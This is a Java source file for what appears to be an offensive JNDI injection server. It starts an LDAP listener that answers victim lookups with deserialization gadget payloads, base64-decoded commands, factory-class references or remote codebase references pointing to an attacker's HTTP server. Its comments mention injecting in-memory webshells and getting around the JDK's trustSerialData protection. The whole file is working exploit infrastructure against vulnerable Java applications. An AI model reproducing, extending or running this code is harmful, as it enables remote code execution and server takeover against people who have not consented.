package sonomon.jndi.main;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import javax.naming.Reference;
import org.apache.naming.ResourceRef;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.URL;
import java.util.Arrays;
import java.util.List;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class LdapStart {
    private static final String LDAP_BASE = "dc=example,dc=com";
    private static  String module = "";
    private static  String gadget = "";
    private static  String payload = "";
    private static  String url = "http://z.cn/";
    public static void main(String[] args) throws Exception {
    	disableAccessWarnings();
        String java_version = System.getProperty("java.version").substring(0,3);
        double version = Double.parseDouble(java_version);        
        if (version < 1.8) {
            System.out.println("此项目最好在java8或者以上版本运行,当前版本: "+version);
		}
        
    	if (args.length == 1) {
            try {
        		Help.ip = args[0].substring(0, args[0].indexOf(":"));
        		url = "http://"+args[0]+"/"; 
    		} catch (Exception e) {
                System.out.println("[*]如果要带传参,请带ip:port,port为http服务");
                System.exit(0);
            }
		} else if (args.length == 3) {
			module = args[0];
			gadget = args[1];
			payload = args[2];
		}
    	
    	Help.getHelp();
        int port = 1389;
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));
        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("[+] Listening on 0.0.0.0:" + port);
        try {
        	ds.startListening();
		} catch (Exception e) {
			System.out.println("[-] 启动失败，可能是端口被占用"+"\r\n");
			System.out.println(e);
		}
    }
    
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        public OperationInterceptor () {
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
        	byte[] javaSerializedData = null;
        	
        	if (base.contains("/")) {
            	System.out.println("[-] 注意使用:分隔而不是/"+"\r\n");
			}
          	
        	            
        	List<String> list = Arrays.asList(base.split("\\:"));
            if (list.size() == 3) {		                         //判断是否能分割成3个字符串
            	
            	module = (String) list.get(0);
            	gadget = (String) list.get(1);
            	payload = (String) list.get(2);
            	
            	payload = payload.replace(" ", "+");            //base64在url传参会把加号变成空格,这里帮忙变回来
            	
            	if (module.equals("deser")) {                      //进入反序列化模块
            		if ( !Deserialize.isDefaultPayload(payload) && ! gadget.equals("urldns")) {	//判断是base64编码的命令，还是回显内存马之类的
                    	try {
                    		payload = new String(Base64.decode(payload));
            			} catch (Exception e2) {
            				System.out.println("[-] payload 无法base64解码");
            			}
            		}
                	base = module+":"+gadget+":"+payload;
                	echo(base);
                	e.addAttribute("javaClassName", "foo");
                	try {
                		javaSerializedData = Deserialize.getJavaSerializeData(gadget, payload);
                	} catch (Exception e2) {
                		System.out.println("[-] 序列化数据获取失败");
                	}
                	
                	e.addAttribute("javaSerializedData", javaSerializedData);  
                	
				} else if (module.contains("Factory")) {		       //进入工厂类模块
            		if ( !Deserialize.isDefaultPayload(payload) ){	//判断是base64编码的命令，还是回显内存马之类的
                    	try {
                    		payload = new String(Base64.decode(payload));
            			} catch (Exception e2) {
            				System.out.println("[-] payload 无法base64解码");
            			}
            		}
	            	base = module+":"+gadget+":"+payload;
	            	echo(base);
	            	
	            	Reference ref = FactoryUtils.invoke(module, gadget, payload);
	            	javaSerializedData = FactoryUtils.objectToBytes(ref);
	            	
	            	String javaClassName = ref.getClassName();
	            	String javaFactory = ref.getFactoryClassName();
	            	
	            	String[] javaReferenceAddress = null;
	            	
	            	javaReferenceAddress = FactoryUtils.getJavaReferenceAddress(ref);
                	
	            	if (ref instanceof ResourceRef) {
		            	e.addAttribute("javaClassName", "foo");
		            	e.addAttribute("javaSerializedData", javaSerializedData);
	            	} else {
		            	//如果使用了trustSerialData=false时,无法使用javaSerializedData.要用下面javaReferenceAddress这种写法
		            	//System.setProperty("com.sun.jndi.ldap.object.trustSerialData", "false");
		             	//jdk20默认开启trustSerialData=false
		            	//BeanFactory存在if (obj instanceof ResourceRef)校验,但ldap客户端返回的是Reference,因此BeanFactory无法用javaReferenceAddress写法
		            	//同理GenericNamingResourcesFactory/ResourceFactory等也不行
		                e.addAttribute("objectClass", "javaNamingReference");
		                e.addAttribute("javaClassName", javaClassName);
		                e.addAttribute("javaFactory", javaFactory);
		        	    e.addAttribute("javaReferenceAddress", javaReferenceAddress);
					}
	            	
				} else {
					System.out.println("[-] 不存在此module: "+module+"\r\n");
				}
            	
			} else {	//最后尝试jndi注入,不带ip:port参数执行url就是z.cn,所以这段没什么用
	            URL turl = new URL(url+base+".class");
				echo(base, turl);
				e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaCodeBase", url);
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaFactory", base);
			}
            
            
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
        protected void echo(String base) {
			System.out.println("[+] Send LDAP reference result to "+base);
		}
        protected void echo(String base, URL method) {
			System.out.println("[+] Send LDAP reference result for " + base + " redirecting to "+method);
		}
        
        
    }
    
    public static void disableAccessWarnings() {
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field field = unsafeClass.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Object unsafe = field.get(null);
 
            Method putObjectVolatile =
                unsafeClass.getDeclaredMethod("putObjectVolatile", Object.class, long.class, Object.class);
            Method staticFieldOffset = unsafeClass.getDeclaredMethod("staticFieldOffset", Field.class);
 
            Class<?> loggerClass = Class.forName("jdk.internal.module.IllegalAccessLogger");
            Field loggerField = loggerClass.getDeclaredField("logger");
            Long offset = (Long)staticFieldOffset.invoke(unsafe, loggerField);
            putObjectVolatile.invoke(unsafe, loggerClass, offset, null);
        } catch (Exception ignored) {
        }
    }
    
}